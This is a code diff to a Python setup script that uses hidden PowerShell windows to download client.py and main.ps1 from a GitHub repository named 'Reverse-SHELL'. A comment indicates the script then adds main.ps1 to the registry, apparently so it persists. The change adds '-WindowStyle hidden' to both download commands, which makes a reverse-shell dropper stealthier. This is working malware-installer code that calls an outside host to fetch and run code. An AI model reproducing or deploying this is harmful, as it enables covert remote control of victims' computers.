@@ -11,11 +11,11 @@ script_path = src_path + '\\Script'
 def setup():
     # download client.py file
     subprocess.call(
-        f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile {file_path}',
+        f'powershell.exe -WindowStyle hidden invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile {file_path}',
         shell=True)
     # download main.ps1 file
     subprocess.call(
-        f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/main.ps1" -outfile {ps1_path}',
+        f'powershell.exe -WindowStyle hidden invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/main.ps1" -outfile {ps1_path}',
         shell=True)
     # reg add main.ps1 file
     subprocess.call(
